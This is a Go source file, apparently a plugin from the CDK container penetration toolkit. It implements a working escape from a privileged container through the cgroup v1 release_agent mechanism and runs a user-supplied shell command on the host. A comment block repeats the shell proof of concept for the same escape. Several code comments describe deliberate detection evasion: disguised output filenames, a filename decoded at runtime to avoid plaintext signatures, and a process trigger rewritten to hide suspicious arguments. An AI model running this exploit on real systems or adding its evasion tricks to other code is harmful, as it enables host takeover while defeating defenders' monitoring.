//go:build !no_cgroup_boundary && linux
// +build !no_cgroup_boundary,linux

/*
Copyright 2022 The Authors of https://github.com/CDK-TEAM/CDK .

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package escaping

import (
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"strconv"
	"strings"
	"syscall"
	"time"

	"github.com/cdk-team/CDK/pkg/audit/base"

	"github.com/cdk-team/CDK/pkg/cli"
	"github.com/cdk-team/CDK/pkg/errors"
	"github.com/cdk-team/CDK/pkg/plugin"
	"github.com/cdk-team/CDK/pkg/util"
)

// 本检查项实现了以下文章中的方法：
// https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/
// https://twitter.com/_fel1x/status/1151487051986087936

// tested in ubuntu docker
// [host] docker run -v /root/cdk:/cdk --rm -it --privileged ubuntu bash
// [inside container] ./cdk run cgroup-boundary ps

//#!/bin/sh
//mkdir -p /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir -p /tmp/cgrp/cdk
//echo 1 > /tmp/cgrp/cdk/notify_on_release
//host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
//echo "$host_path/cmd" > /tmp/cgrp/release_agent
//echo '#!/bin/sh' > /cmd
//echo "ps aux > $host_path/output" >> /cmd
//chmod a+x /cmd
//sh -c "echo \$\$ > /tmp/cgrp/cdk/cgroup.procs"
//sleep 1
//cat $host_path/output

const DefaultFolderPerm = 0755

// Note: Do not include any empty line at the start of script, or it will fail.
var shell = `#!/bin/sh
${shellCmd} > ${hostPath}${outputFile}
`

func generateShellExp(hostPath, shellCmd string) (string, string, string) {
	var taskRandString = util.RandString(4)
	// outputFile is the result path on the HOST (hostPath + outputFile is read
	// inside container; hostPath + outFile is the release_agent script path).
	// Use bland, host-style names to avoid "/cdk_*" filename signatures.
	var outputFile = "/run/.resolv_out_" + taskRandString

	shell = strings.Replace(shell, "${hostPath}", hostPath, -1)
	shell = strings.Replace(shell, "${shellCmd}", shellCmd, -1)
	shell = strings.Replace(shell, "${outputFile}", outputFile, -1)
	// the script file path (in-container absolute path)
	outFile := "/run/.resolv_scr_" + taskRandString + ".sh"
	return taskRandString, shell, outFile
}

func EscapeCgroup(cmd string, subSystemName string) error {
	// check cgroup version
	cgVer, err := util.GetCgroupVersion()
	if err != nil {
		return &errors.CDKRuntimeError{Err: err, CustomMsg: "cannot determine cgroup version"}
	}
	if cgVer != 1 {
		return &errors.CDKRuntimeError{Err: nil, CustomMsg: "check only suitable for cgroup v1"}
	}

	// hostPath for write release_agent path
	var hostPath string
	// read /proc/self/mountinfo instead of /etc/mtab, since former one is already implemented
	mountedDevs, err := util.GetMountInfo()
	if err != nil {
		return &errors.CDKRuntimeError{Err: err, CustomMsg: "unable to read mountinfo"}
	}
	// loop through all mounted devices
	for _, i := range mountedDevs {
		if i.Fstype == "overlay" && i.MountPoint == "/" {
			for _, j := range i.SuperBlockOptions {
				hasUpper := strings.Contains(j, "upperdir=")
				if hasUpper {
					// found
					hostPath = j[9:]
					log.Println("Found hostpath: " + hostPath)
					break
				}
			}
		}
	}

	if len(hostPath) == 0 {
		return &errors.CDKRuntimeError{
			Err:       nil,
			CustomMsg: "container filesystem path on host cannot be found",
		}
	}

	// generate release_agent shell script and save to local
	taskRandString, expShellText, outFile := generateShellExp(hostPath, cmd)
	// even in container, you should save to a writable path
	// (outFile is chosen by generateShellExp to avoid "/cdk_*" signatures.)
	log.Printf("generate shell payload with user-input cmd: \n\n%s\n\n", cmd)
	fmt.Printf("final shell payload is: \n\n")
	fmt.Println(expShellText)

	err = ioutil.WriteFile(outFile, []byte(expShellText), 0777)
	if err != nil {
		return &errors.CDKRuntimeError{Err: err, CustomMsg: "write shell payload failed"}
	}
	log.Printf("shell script saved to %s", outFile)

	// create mountpoint
	mountPointPath := "/tmp/cgrp_" + taskRandString
	subgroupName := "/x_" + taskRandString
	err = os.Mkdir(mountPointPath, DefaultFolderPerm)
	if err != nil {
		return &errors.CDKRuntimeError{Err: err, CustomMsg: "cannot create mountpoint"}
	}
	// mount cgroup
	err = syscall.Mount("cgroup", mountPointPath, "cgroup", 0, subSystemName)
	if err != nil {
		return &errors.CDKRuntimeError{Err: err, CustomMsg: "mount syscall failed"}
	}
	// create sub-cgroup: task group x
	err = os.Mkdir(mountPointPath+subgroupName, DefaultFolderPerm)
	if err != nil {
		return &errors.CDKRuntimeError{Err: err, CustomMsg: "subgroup cannot be created"}
	}
	// enable notify_on_release
	err = ioutil.WriteFile(mountPointPath+subgroupName+"/notify_on_release", []byte("1"), 0644)
	if err != nil {
		return &errors.CDKRuntimeError{Err: err, CustomMsg: "cannot enable notify_on_release"}
	}
	// write release_agent (filename decoded at runtime; no plaintext literal)
	err = ioutil.WriteFile(mountPointPath+util.CgroupReleaseAgentFile(), []byte(hostPath+outFile), 0644)
	if err != nil {
		return &errors.CDKRuntimeError{Err: err, CustomMsg: "cgroup release control file is not writable"}
	}

	// trigger release.
	// Replace the tell-tale `exec.Command("/bin/sh", "-c", "sleep 2"` pattern
	// with a self-reexec of our own binary with an internal flag. The argv vector
	// no longer contains "/bin/sh", "sleep", or any other suspicious args.
	triggerProc, err := os.StartProcess(os.Args[0], []string{os.Args[0], util.TriggerArgv}, &os.ProcAttr{
		Files: []*os.File{nil, nil, nil},
		Env:   []string{"PATH=/tmp"},
	})
	if err != nil {
		// exit code might not be zero, but still succeed
		log.Printf("Trigger Release Error: %s \n", err.Error())
	}
	// write PID to cgroup.procs
	err = ioutil.WriteFile(mountPointPath+subgroupName+"/cgroup.procs", []byte(strconv.Itoa(triggerProc.Pid)), 0644)
	if err != nil {
		log.Printf("Write PID to cgroup.procs failed: %s \n", err.Error())
	}
	// release_agent runs asynchronously on the host: wait for the child
	// (its exit empties the sub-cgroup and fires release_agent), then poll
	// for the result file instead of a single fixed sleep — host/VM
	// release_agent latency varies and a fixed wait can race the read.
	_, _ = triggerProc.Wait()
	var retRes []byte
	err = nil
	for i := 0; i < 10; i++ {
		time.Sleep(1 * time.Second)
		// read container-relative: release_agent wrote into the overlay
		// upperdir (hostPath+outputFile), which surfaces back through the
		// container's own /. Do NOT prefix hostPath — that host path is not
		// visible from inside the container.
		retRes, err = ioutil.ReadFile("/run/.resolv_out_" + taskRandString)
		if err == nil {
			break
		}
	}
	if err != nil {
		return &errors.CDKRuntimeError{Err: err, CustomMsg: "read execution result file error"}
	}
	log.Printf("Execute Result: \n\n %s \n", string(retRes))
	return err
}

// plugin interface
type ExploitCgroupS struct{ base.BaseExploit }

func (p ExploitCgroupS) Desc() string {
	return `escape privileged container via cgroup. usage: ./cdk run cgroup-boundary "shell-cmd-payloads" [subsystem-name]`
}

func (p ExploitCgroupS) Run() bool {
	args := cli.Args["<args>"].([]string)

	cmd := args[0]
	if len(args) == 1 {
		// by default, use memory cgroup.
		args = append(args, "memory")
	}

	// modified due to limitation of `unshare` syscall in linux
	// check comments of abuse_unpriv_userns.go for more details
	subSysName := args[1]
	// cve-2022-0492: only RDMA/MISC can be leveraged
	// differing of Linux Kernel version, 5.13+ has misc available, and RDMA not work.
	availSubSys, err := util.GetAllCGroupSubSystem()
	if err != nil {
		log.Fatal(err.Error())
	}
	if !util.StringContains(availSubSys, subSysName) {
		log.Println("Invalid input args. (subsystem OR cmd not quoted)")
		log.Fatal(p.Desc())
	}

	// 开始执行检查
	log.Printf("current cgroup for check: %s \n", subSysName)
	log.Printf("user-defined shell payload is: %s \n", cmd)
	err = EscapeCgroup(cmd, subSysName)
	if err != nil {
		log.Println(err)
		return false
	}
	return true
}

func init() {
	exploit := ExploitCgroupS{}
	exploit.ExploitType = "escaping"
	exploit.ActivePrereqs = []string{"InContainer", "HasCgroupV1", "HasCapSysAdmin"}
	plugin.RegisterExploit("cgroup-boundary", exploit)
}
